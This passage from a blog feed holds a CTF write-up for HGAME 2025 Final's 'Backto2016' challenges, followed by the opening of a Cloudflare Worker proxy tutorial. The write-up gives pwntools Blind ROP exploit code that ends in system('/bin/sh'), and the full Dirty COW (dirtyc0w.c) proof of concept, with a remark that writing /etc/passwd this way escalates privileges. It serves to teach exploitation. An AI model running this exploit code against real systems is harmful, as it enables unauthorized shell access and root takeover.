    <content type="html"><![CDATA[<h1 id="backto2016">Backto2016</h1><blockquote><p>但你必须先向我们证明自己有回到 2016 的实力！</p><p>祝你玩的开心 o (￣▽￣) ブ</p><p><strong>没有附件是正常的喵</strong></p><p><strong>这个分数或许也考虑了买 hint 这件事，别害怕嘻嘻</strong></p></blockquote><p>这道题是没有给出附件的，我们需要根据输入和程序的输出获取一切信息。<span id="more"></span></p><p><img src="\2025320-HGAME-2025-Final-复现\image-20250320223509755.png"></p><h2 id="vulnerabilities">Vulnerabilities</h2><p>随便输入一些字符会发现，程序存在<strong>栈溢出</strong>漏洞，出题人很友好地提供了程序崩溃的更多信息（***stack smashing detected ***: terminated）</p><p>存在 <strong>Canary 保护</strong>。</p><p><img src="\2025320-HGAME-2025-Final-复现\image-20250320223905338.png"></p><p>注意到在交互进程结束后，会保持连接，返回一个 PID+1 的新进程，这提示我们程序使用 <code>fork()</code> 实现功能。</p><figure><img src="\2025320-HGAME-2025-Final-复现\image-20250320224713735.png" alt="赛后放出的源码"><figcaption aria-hidden="true">赛后放出的源码</figcaption></figure><p>因此，子进程的 Canary 值不会改变。</p><h2 id="exploit">Exploit</h2><p>从题目的提示可以知道，其实这是类似于 HCTF2016 brop<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a> 的一道题目。</p><p>运用的攻击方法叫做 Blind Return Oriented Programming (BROP)<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>。</p><p>BROP 的主要流程：</p><ol type="1"><li><p>绕过 Canary 和 PIE 的保护；</p></li><li><p>寻找 "stop gadget";</p></li><li><p> 寻找控制寄存器的 gadget;</p></li><li><p>dump memory to get the binary</p></li><li><p> 获得 libc base，然后 get shell</p></li></ol><h3 id="canary-bypass">Canary bypass</h3><p>BROP 首先需要我们绕过 Canary：</p><figure><img src="\2025320-HGAME-2025-Final-复现\image-20250321183913870.png" alt="Stack reading. A single byte on the stack is overwritten with guess X. If the service crashes, the wrong value was guessed."><figcaption aria-hidden="true">Stack reading. A single byte on the stackis overwritten with guess X. If the service crashes, the wrong value wasguessed.</figcaption></figure><h3 id="stop-gadget">Stop gadget</h3><p>Stop gadget 指的是可以将程序挂起的一段 gadget。</p><p>为什么需要 Stop gadget? 如果我们将 Returnaddress 覆盖成随机的数据，那么很大概率会引发段错误。而 Stopgadget 能让程序保持正常运行，在寻找其他 gadget 时起到了区分作用。</p><figure><img src="\2025320-HGAME-2025-Final-复现\image-20250321191706066.png" alt="stop gadget is useful!"><figcaption aria-hidden="true">stop gadget is useful!</figcaption></figure><p>当我们成功找到了一个 gadget，<code>$rsp</code> 进入寄存器，程序进入 <code>$rsp+8&lt;stop_gadget&gt;</code>。</p><p>如果还未找到这个 gadget，程序会直接发生段错误。这个作用在下一节会更具体地体现。</p><h3 id="common-gadget">Common gadget</h3><p>在 Ubuntu14.04 中，我们有一个很好的函数<code>__libc_csu_init()</code>，里面存在控制传参寄存器的 gadget，具体请参考<a href="https://www.bookstack.cn/read/CTF-All-In-One/doc-4.7_common_gadget.md">通用gadget</a>。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040082a &lt;+90&gt;:    5b      pop    rbx</span><br><span class="line">0x000000000040082b &lt;+91&gt;:    5d      pop    rbp</span><br><span class="line">0x000000000040082c &lt;+92&gt;:    41 5c   pop    r12</span><br><span class="line">0x000000000040082e &lt;+94&gt;:    41 5d   pop    r13</span><br><span class="line">0x0000000000400830 &lt;+96&gt;:    41 5e   pop    r14</span><br><span class="line">0x0000000000400832 &lt;+98&gt;:    41 5f   pop    r15</span><br><span class="line">0x0000000000400834 &lt;+100&gt;:   c3      ret</span><br></pre></td></tr></tbody></table></figure><p>所以，我们可以这样布置栈数据：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = flat({</span><br><span class="line">    offset: [</span><br><span class="line">        canary,</span><br><span class="line">        p64(<span class="number">1</span>),</span><br><span class="line">        p64(pop_gadget),</span><br><span class="line">        p64(<span class="number">0</span>)*<span class="number">6</span>,</span><br><span class="line">        p64(stop_gadget)</span><br><span class="line">        ]</span><br><span class="line">    })</span><br></pre></td></tr></tbody></table></figure><p>但是还存在一个小问题，如果遍历时 <code>pop_gadget</code> 恰好是另一个 stopgadget，程序也不会发生段错误，和执行到真正的 gadget 处结果一样。</p><p>因此，我们还需要进一步验证，它是否我们需要的。</p><p>在这道题中，我找到的 stop gadget 会输出一些固定字符：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="string">b"killed by"</span> <span class="keyword">not</span> <span class="keyword">in</span> resp):</span><br><span class="line">    payload = flat({</span><br><span class="line">            offset: [</span><br><span class="line">                canary,</span><br><span class="line">                p64(<span class="number">1</span>),</span><br><span class="line">                p64(pop_gadget)</span><br><span class="line">                ]</span><br><span class="line">            })</span><br><span class="line">            p.sendafter(<span class="string">"password"</span>,payload)</span><br><span class="line">            resp = p.recv()</span><br><span class="line">            resp = p.recv()</span><br><span class="line">            log.success(<span class="string">f"stop_gadget[<span class="subst">{i}</span>] = <span class="subst">{<span class="built_in">hex</span>(stop_gadget)}</span>"</span>)</span><br><span class="line">            log.success(<span class="string">f"pop_gadget[<span class="subst">{i}</span>] = <span class="subst">{<span class="built_in">hex</span>(pop_gadget)}</span>"</span>)</span><br><span class="line">            choose = <span class="built_in">input</span>(<span class="string">"Continue?"</span>)</span><br><span class="line">            <span class="keyword">if</span>(choose==<span class="string">"y"</span> <span class="keyword">or</span> choose==<span class="string">"Y"</span>):<span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></tbody></table></figure><p>观察回显，如果没有输出，那么这大概率是正确的。当然在后续过程中我们可以更确定这个 gadget 是不是真的。</p><h3 id="dump-memory">Dump memory</h3><p>得到需要的 gadget，就可以开始 dump memory 了。</p><p>为了找到 <code>write()</code> 的 plt 地址，可以将 <code>$rdi</code> 赋值 <code>0x400000</code>，即 <code>write(0x400000)</code>，如果地址正确，我们会得到 ELF 头几个固定字符：<code>\x7fELF</code></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    put_addr += <span class="number">1</span></span><br><span class="line">    payload = flat({</span><br><span class="line">    offset: [</span><br><span class="line">        canary,</span><br><span class="line">        p64(<span class="number">1</span>),</span><br><span class="line">        p64(pop_gadget),</span><br><span class="line">        p64(<span class="number">0x400000</span>),<span class="comment">#pop rdi</span></span><br><span class="line">        p64(put_addr),</span><br><span class="line">        p64(stop_gadget)</span><br><span class="line">        ]</span><br><span class="line">    })</span><br><span class="line">    p.sendafter(<span class="string">"password"</span>,payload)</span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        resp = p.recv()</span><br><span class="line">        resp = p.recv()</span><br><span class="line">        <span class="keyword">if</span> ( <span class="string">b"\x7fELF"</span> <span class="keyword">in</span> resp):</span><br><span class="line">            log.success(<span class="string">f"put found[<span class="subst">{i}</span>] = <span class="subst">{<span class="built_in">hex</span>(put_addr)}</span>"</span>)</span><br><span class="line">            choose = <span class="built_in">input</span>(<span class="string">"Continue?"</span>)</span><br><span class="line">            <span class="keyword">if</span>(choose==<span class="string">"y"</span> <span class="keyword">or</span> choose==<span class="string">"Y"</span>):<span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></tbody></table></figure><p><img src="\2025320-HGAME-2025-Final-复现/image-20250401111921507.png"></p><p>回顾 <code>plt</code> 表的知识，我们知道，已经调用过的函数地址会被保存在<code>.got</code> 段中。</p><h2 id="get-shell">Get shell</h2><p>后续过程就比较简单了，写 ROP 链即可。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">stop_gadget=<span class="number">0x400700</span></span><br><span class="line">pop_gadget=<span class="number">0x400b2a</span>+<span class="number">0x9</span></span><br><span class="line">put_addr = <span class="number">0x400715</span></span><br><span class="line">got_addr = <span class="number">0x602018</span></span><br><span class="line">payload = flat({</span><br><span class="line">      offset: [</span><br><span class="line">        canary,</span><br><span class="line">        p64(<span class="number">1</span>),</span><br><span class="line">        p64(pop_gadget),</span><br><span class="line">        p64(got_addr),<span class="comment">#pop rdi</span></span><br><span class="line">        p64(put_addr),</span><br><span class="line">    ]</span><br><span class="line">})</span><br><span class="line">p.sendafter(<span class="string">"password:\n"</span>,payload)</span><br><span class="line">put_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">log.success(<span class="built_in">hex</span>(put_addr))</span><br><span class="line">libc_base = put_addr - libc.sym[<span class="string">"puts"</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line">binsh_addr = libc_base +<span class="built_in">next</span>(libc.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload = flat({</span><br><span class="line">      offset: [</span><br><span class="line">        canary,</span><br><span class="line">        p64(<span class="number">1</span>),</span><br><span class="line">        p64(pop_gadget),</span><br><span class="line">        p64(binsh_addr),<span class="comment">#pop rdi</span></span><br><span class="line">        p64(sys_addr),</span><br><span class="line">    ]</span><br><span class="line">})</span><br><span class="line">p.sendafter(<span class="string">"password:"</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="backto20162">Backto2016(2)</h1><p>这题赛时并没有做出来（而且靶机跑的很慢，爆破不动），后面看了 wp 了解到这是一个 kernelvulnerability。</p><h2 id="copy-on-write3">Copy On Write<a href="#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a></h2><blockquote><p><strong>Copy-on-write</strong> (<strong>COW</strong>), also called<strong>implicit sharing</strong>or <strong>shadowing</strong>,is a <a href="https://en.wikipedia.org/wiki/Resource_management_(computing)">resource-management</a>technique used in <a href="https://en.wikipedia.org/wiki/Computer_programming">programming</a>to manage shared data efficiently. Instead of copying data right awaywhen multiple programs use it, the same data is shared between programsuntil one tries to modify it. If no changes are made, no private copy iscreated, saving <a href="https://en.wikipedia.org/wiki/System_resource#General_resources">resources</a>.A copy is only made when needed, ensuring each program has its ownversion when modifications occur. This technique is commonly applied tomemory, files, and data structures.</p></blockquote><p>例如 <code>fork()</code> 创建子进程时，为了节省内存空间和时间开销，使用了写时复制的策略。</p><figure><img src="\2025320-HGAME-2025-Final-复现/image-20250402223714523.png" alt="Take a lot space and time"><figcaption aria-hidden="true">Take a lot space and time</figcaption></figure><figure><img src="\2025320-HGAME-2025-Final-复现/image-20250402224043883.png" alt="Copy-on-write"><figcaption aria-hidden="true">Copy-on-write</figcaption></figure><h2 id="dirty-cow4">Dirty-cow<a href="#fn4" class="footnote-ref" id="fnref4" role="doc-noteref"><sup>4</sup></a></h2><p>通过 <code>mmap()</code> 映射文件到内存，利用写时复制，<code>write</code> 和 <code>madvise()</code> 导致的条件竞争漏洞。</p><p>下面是它的一个 POC，可参见：<a href="https://github.com/dirtycow/dirtycow.github.io">https://github.com/dirtycow/dirtycow.github.io</a></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">####################### dirtyc0w.c #######################</span></span><br><span class="line"><span class="comment">$ sudo -s</span></span><br><span class="line"><span class="comment"># echo this is not a test &gt; foo</span></span><br><span class="line"><span class="comment"># chmod 0404 foo</span></span><br><span class="line"><span class="comment">$ ls -lah foo</span></span><br><span class="line"><span class="comment">-r-----r-- 1 root root 19 Oct 20 15:23 foo</span></span><br><span class="line"><span class="comment">$ cat foo</span></span><br><span class="line"><span class="comment">this is not a test</span></span><br><span class="line"><span class="comment">$ gcc -pthread dirtyc0w.c -o dirtyc0w</span></span><br><span class="line"><span class="comment">$ ./dirtyc0w foo m00000000000000000</span></span><br><span class="line"><span class="comment">mmap 56123000</span></span><br><span class="line"><span class="comment">madvise 0</span></span><br><span class="line"><span class="comment">procselfmem 1800000000</span></span><br><span class="line"><span class="comment">$ cat foo</span></span><br><span class="line"><span class="comment">m00000000000000000</span></span><br><span class="line"><span class="comment">####################### dirtyc0w.c #######################</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="type">int</span> f;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"><span class="type">char</span> *name;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> *str;</span><br><span class="line">  str=(<span class="type">char</span>*)arg;</span><br><span class="line">  <span class="type">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100000000</span>;i++)</span><br><span class="line">  {</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661</span></span><br><span class="line"><span class="comment">&gt; This is achieved by racing the madvise(MADV_DONTNEED) system call</span></span><br><span class="line"><span class="comment">&gt; while having the page of the executable mmapped in memory.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    c+=madvise(<span class="built_in">map</span>,<span class="number">100</span>,MADV_DONTNEED);</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"madvise %d\n\n"</span>,c);</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> *<span class="title function_">procselfmemThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> *str;</span><br><span class="line">  str=(<span class="type">char</span>*)arg;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16</span></span><br><span class="line"><span class="comment">&gt;  The in the wild exploit we are aware of doesn't work on Red Hat</span></span><br><span class="line"><span class="comment">&gt;  Enterprise Linux 5 and 6 out of the box because on one side of</span></span><br><span class="line"><span class="comment">&gt;  the race it writes to /proc/self/mem, but /proc/self/mem is not</span></span><br><span class="line"><span class="comment">&gt;  writable on Red Hat Enterprise Linux 5 and 6.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  <span class="type">int</span> f=open(<span class="string">"/proc/self/mem"</span>,O_RDWR);</span><br><span class="line">  <span class="type">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100000000</span>;i++) {</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to reset the file pointer to the memory position.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    lseek(f,(<span class="type">uintptr_t</span>) <span class="built_in">map</span>,SEEK_SET);</span><br><span class="line">    c+=write(f,str,<span class="built_in">strlen</span>(str));</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"procselfmem %d\n\n"</span>, c);</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[])</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to pass two arguments. File and Contents.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  <span class="keyword">if</span> (argc&lt;<span class="number">3</span>) {</span><br><span class="line">  (<span class="type">void</span>)<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>,</span><br><span class="line">      <span class="string">"usage: dirtyc0w target_file new_content"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>; }</span><br><span class="line">  <span class="type">pthread_t</span> pth1,pth2;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to open the file in read only mode.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  f=open(argv[<span class="number">1</span>],O_RDONLY);</span><br><span class="line">  fstat(f,&amp;st);</span><br><span class="line">  name=argv[<span class="number">1</span>];</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to use MAP_PRIVATE for copy-on-write mapping.</span></span><br><span class="line"><span class="comment">&gt; Create a private copy-on-write mapping.  Updates to the</span></span><br><span class="line"><span class="comment">&gt; mapping are not visible to other processes mapping the same</span></span><br><span class="line"><span class="comment">&gt; file, and are not carried through to the underlying file.  It</span></span><br><span class="line"><span class="comment">&gt; is unspecified whether changes made to the file after the</span></span><br><span class="line"><span class="comment">&gt; mmap() call are visible in the mapped region.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to open with PROT_READ.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>,st.st_size,PROT_READ,MAP_PRIVATE,f,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"mmap %zx\n\n"</span>,(<span class="type">uintptr_t</span>) <span class="built_in">map</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to do it on two threads.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  pthread_create(&amp;pth1,<span class="literal">NULL</span>,madviseThread,argv[<span class="number">1</span>]);</span><br><span class="line">  pthread_create(&amp;pth2,<span class="literal">NULL</span>,procselfmemThread,argv[<span class="number">2</span>]);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to wait for the threads to finish.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  pthread_join(pth1,<span class="literal">NULL</span>);</span><br><span class="line">  pthread_join(pth2,<span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>以 <code>~/foo</code> 为例，这是一个只读文件：</p><p><img src="\2025320-HGAME-2025-Final-复现/image-20250402225857712.png"></p><p><img src="\2025320-HGAME-2025-Final-复现/image-20250402225927656.png"></p><p>运行 <code>dirtycow</code>：</p><p><img src="\2025320-HGAME-2025-Final-复现/image-20250402230038064.png"></p><p>结果如下：</p><p><img src="\2025320-HGAME-2025-Final-复现/image-20250402230133893.png"></p><p>同理，如果我们修改 <code>/etc/passwd</code>，就可以实现提权。</p><h1 id="references">References</h1><section id="footnotes" class="footnotes footnotes-end-of-document" role="doc-endnotes"><hr><ol><li id="fn1"><p><a href="https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.1_pwn_hctf2016_brop.md">pwn_hctf2016_brop.md</a><a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn2"><p><a href="https://www.scs.stanford.edu/brop/bittau-brop.pdf">bittau-brop.pdf</a><a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn3"><p><a href="https://en.wikipedia.org/wiki/Copy-on-write#cite_note-1">Copy-on-write</a><a href="#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn4"><p><a href="https://blog.csdn.net/hbhgyu/article/details/106245182">DirtyCOW</a><a href="#fnref4" class="footnote-back" role="doc-backlink">↩︎</a></p></li></ol></section>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;backto2016&quot;&gt;Backto2016&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;但你必须先向我们证明自己有回到 2016 的实力！&lt;/p&gt;
&lt;p&gt;祝你玩的开心 o (￣▽￣) ブ&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;没有附件是正常的喵&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这个分数或许也考虑了买 hint 这件事，别害怕嘻嘻&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这道题是没有给出附件的，我们需要根据输入和程序的输出获取一切信息。</summary>
    
    
    
    <category term="CTF" scheme="http://summ2.link/categories/CTF/"/>
    
    
    <category term="pwn" scheme="http://summ2.link/tags/pwn/"/>
    
    <category term="hgame" scheme="http://summ2.link/tags/hgame/"/>
    
    <category term="kernel" scheme="http://summ2.link/tags/kernel/"/>
    
    <category term="blind pwn" scheme="http://summ2.link/tags/blind-pwn/"/>
    
  </entry>
  
  <entry>
    <title>Cloudflare Worker 反向代理尝试</title>
    <link href="http://summ2.link/categories/Web/cloudflare-worker-proxy/"/>
    <id>http://summ2.link/categories/Web/cloudflare-worker-proxy/</id>
    <published>2025-03-01T16:00:00.000Z</published>
    <updated>2025-05-08T04:14:53.054Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>由于友链页面有使用图片的要求，同时为其他人的站点提供相关的图片资源（虽然使用现成的 GitHubPage 就可以基本实现，但是 Page 所在的仓库是公开的），尝试通过 GitHub 作为图床解决这个问题。然而，访问速度和稳定性都无法得到保证，为此通过网上搜索学习了一下反向代理(Reverse Proxy) 的相关知识。</p><span id="more"></span><h1 id="什么事反向代理">什么事反向代理</h1><p>在这之前，先来看看什么是正向代理 <a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a> (Forward Proxy)：</p><p>客户端通过代理服务器去请求服务器的资源。</p><figure><img src="/202532-Cloudflare-Worker-反向代理尝试\1920px-Proxy_concept_en.svg.png" alt="Two computers connected via a proxy server. The first computer says to the proxy server: &quot;ask the second computer what the time is&quot;."><figcaption aria-hidden="true">Two computers connected via a proxyserver. The first computer says to the proxy server: "ask the secondcomputer what the time is".</figcaption></figure><p>使用正向代理需要客户端进行一些设置，即配置代理服务器。</p><p>而反向代理 <a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a> 是指代理服务器向服务器转交请求，并返回内容给客户端，客户端将其认为是原始服务器。</p><figure><img src="/202532-Cloudflare-Worker-反向代理尝试\2560px-Reverse_proxy_h2g2bob.svg.png" alt="A proxy server connecting the Internet to an internal network."><figcaption aria-hidden="true">A proxy server connecting the Internet toan internal network.</figcaption></figure><h1 id="搭建反向代理服务">搭建反向代理服务</h1><h2 id="创建图床仓库">创建图床仓库</h2><p>在 GitHub 中创建一个仓库，可以选择是否是私密的。</p><p><img src="/202532-Cloudflare-Worker-反向代理尝试\image-20250302175549537.png"></p><p>在 <a href="https://github.com/settings/tokens">Personal AccessTokens (Classic)</a> 处创建一个新的 token，勾选 <code>repo</code>下所有权限。</p><p><img src="/202532-Cloudflare-Worker-反向代理尝试\image-20250302175927347.png"></p><p>过期时间我偷懒选了永不过期，不过这样肯定会导致安全性降低的。生成 token 后放在安全的地方，刷新后就看不见了。</p><h2 id="配置-worker">配置 Worker</h2><p><a href="https://www.cloudflare-cn.com/developer-platform/products/workers/">CloudflareWorkers</a>提供了这样的服务，但是免费使用具有一定的请求限制。在仪表板中添加一个Worker，这里命名为 assets。使用的代码如下：</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 